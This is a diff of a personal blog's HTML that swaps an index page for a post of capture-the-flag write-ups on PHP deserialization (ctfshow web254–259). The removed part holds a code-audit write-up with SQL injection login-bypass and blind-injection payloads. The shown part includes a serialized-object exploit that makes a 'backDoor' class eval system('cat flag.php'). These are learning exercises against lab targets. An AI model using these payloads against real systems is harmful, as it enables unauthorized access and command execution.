@@ -19,23 +19,31 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
 
-    <meta property="og:type" content="website">
-<meta property="og:title" content="My0n9s&#39;blog">
-<meta property="og:url" content="http://example.com/index.html">
+    <meta name="description" content="前言反序列化是比较重要的一种漏洞类型。之前见过的一些反序列化题目也基本上都停留在少量代码上面。不管是绕过，还是反序列化链，还是phar反序列化、session反序列化。都是集中在少数代码。这次希望能从整个大框架的角度去学习反序列化。增大代码量。所以这部分文章是关于反序列化的刷题、复习和提升。 web254给了代码： 12345678910111213141516171819202122232425">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化刷题">
+<meta property="og:url" content="http://example.com/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B7%E9%A2%98/index.html">
 <meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言反序列化是比较重要的一种漏洞类型。之前见过的一些反序列化题目也基本上都停留在少量代码上面。不管是绕过，还是反序列化链，还是phar反序列化、session反序列化。都是集中在少数代码。这次希望能从整个大框架的角度去学习反序列化。增大代码量。所以这部分文章是关于反序列化的刷题、复习和提升。 web254给了代码： 12345678910111213141516171819202122232425">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.picui.cn/free/2024/11/18/673aadd463d1b.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/11/18/673ab5b4c02f0.png">
+<meta property="article:published_time" content="2024-11-18T02:31:41.000Z">
+<meta property="article:modified_time" content="2024-11-18T07:33:23.290Z">
 <meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.picui.cn/free/2024/11/18/673aadd463d1b.png">
 
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B7%E9%A2%98/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B7%E9%A2%98/","path":"2024/11/18/反序列化刷题/","title":"反序列化刷题"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>My0n9s'blog</title>
+<title>反序列化刷题 | My0n9s'blog</title>
   
 
 
@@ -68,7 +76,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">My0n9s'blog</h1>
+      <p class="site-title">My0n9s'blog</p>
       <i class="logo-line"></i>
     </a>
   </div>
@@ -94,7 +102,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -107,6 +115,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web254"><span class="nav-number">1.1.</span> <span class="nav-text">web254</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web255"><span class="nav-number">1.2.</span> <span class="nav-text">web255</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web256"><span class="nav-number">1.3.</span> <span class="nav-text">web256</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web257"><span class="nav-number">1.4.</span> <span class="nav-text">web257</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web258"><span class="nav-number">1.5.</span> <span class="nav-text">web258</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web259"><span class="nav-number">1.6.</span> <span class="nav-text">web259</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -148,118 +157,17 @@
 
     </div>
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="My0n9s">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/11/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">代码审计</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2024-11-18 21:22:07 / Modified: 23:02:28" itemprop="dateCreated datePublished" datetime="2024-11-18T21:22:07+08:00">2024-11-18</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h2><p>这个代码不是mvc架构，一个个看就行。</p>
-<p>一开始访问的是<code>login.php</code>，这里给了表单，有校验逻辑，在<code>checklogin.php</code>里面：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>$sql=&quot;select sds_password from sds_user where sds_username=&#39;&quot;.$username.&quot;&#39; order by id limit 1;&quot;;</code>这里<code>username</code>参数可控，并且没做任何过滤，存在SQL注入。</p>
-<p>这里一开始我是直接尝试用万能密码，但是提示我用户名和密码错误。这里其实很费解。但是仔细看看代码逻辑确实是这样：</p>
-<p>当我们用传<code>userid=admin&#39; or 1#&amp;password=1</code>时，确实是万能密码，然后也确实是执行了，因为返回的结果行肯定是&gt;&#x3D;1，所以下面的这个if逻辑语句直接跳过去了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因为这里我们不知道返回的<code>$row[&#39;sds_password&#39;]</code>，所以我们去构造的<code>$userpwd</code>也不会相等，所以：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个其实也绕过去了。</p>
-<p>所以就执行了：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>所以就会跳转到<code>login.php</code>，然后因为这里的<code>$_SESSION[&#39;error&#39;]=&quot;1&quot;;</code>，所以：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login</span>-<span class="title">font</span>&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">i</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">isset</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">error</span>&#x27;]) &amp;&amp;( $<span class="title">_SESSION</span>[&#x27;<span class="title">error</span>&#x27;]=1)?&quot;用户名密码错误&quot;:&quot;&quot;;?&gt; &lt;/<span class="title">i</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>解释完万能密码为啥不行之后，我们尝试别的思路，首先我们可以用<code>union select </code>来构造虚拟表么，这样就可以让返回的<code>row[&#39;sds_password&#39;]</code>可控，又因为<code>$username</code>可控，所以绕过。</p>
-<p>payload : post 传<code>userid=-1&#39;union select 123#&amp;userpwd=123</code> ，因为这里的语句是<code>select sds_password from sds_user where sds_username=</code>，是查询一个字段<code>sds_password</code>，所以这里构建虚拟表是一个位。</p>
-<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>针对这一块的代码，可以直接数组绕过：</p>
-<p><code>userid=admin&amp;userpwd[]=1</code></p>
-<h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>这里也可以尝试时间盲注，经过测试<code>userid=admin&#39; or sleep(2)#&amp;userpwd=1</code></p>
-<h3 id="解法四"><a href="#解法四" class="headerlink" title="解法四"></a>解法四</h3><p>其实可以直接访问<code>index.php</code> </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>主要就是这段代码，这里可以看到<code>header(&quot;location:login.php&quot;);</code>，重定向之后没有<code>exit();</code>，所以我们可以在<code>burpsute</code>上面的<code>history</code>上面看到<code>index.php</code>的返回信息。</p>
-<p><img src="https://img.picgo.net/2024/11/18/web301d6e29cf380c7db3f.png" alt="web301"></p>
-<p>可以直接回显出<code>index.php</code>的页面；</p>
-<p>这里跟着松学到了一个小技巧，可以不用把<code>intercept</code>打开，直接去<code>Proxy</code>的<code>HTTP history</code>看。这里想在那个页面去发包，可以直接找到对应的页面右击选中，然后<code>ctrl+R</code>放到<code>repeater</code>模块。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B7%E9%A2%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -273,13 +181,13 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
+      <meta itemprop="name" content="反序列化刷题 | My0n9s'blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B7%E9%A2%98/" class="post-title-link" itemprop="url">反序列化刷题</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          反序列化刷题
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -302,8 +210,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>反序列化是比较重要的一种漏洞类型。之前见过的一些反序列化题目也基本上都停留在少量代码上面。不管是绕过，还是反序列化链，还是<code>phar</code>反序列化、<code>session</code>反序列化。都是集中在少数代码。这次希望能从整个大框架的角度去学习反序列化。增大代码量。所以这部分文章是关于反序列化的刷题、复习和提升。</p>
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>反序列化是比较重要的一种漏洞类型。之前见过的一些反序列化题目也基本上都停留在少量代码上面。不管是绕过，还是反序列化链，还是<code>phar</code>反序列化、<code>session</code>反序列化。都是集中在少数代码。这次希望能从整个大框架的角度去学习反序列化。增大代码量。所以这部分文章是关于反序列化的刷题、复习和提升。</p>
 <h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>给了代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -348,7 +255,6 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&quot;xyz&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>,<span class="string">&quot;O:+&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2>
-      
     </div>
 
     
@@ -356,259 +262,24 @@
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
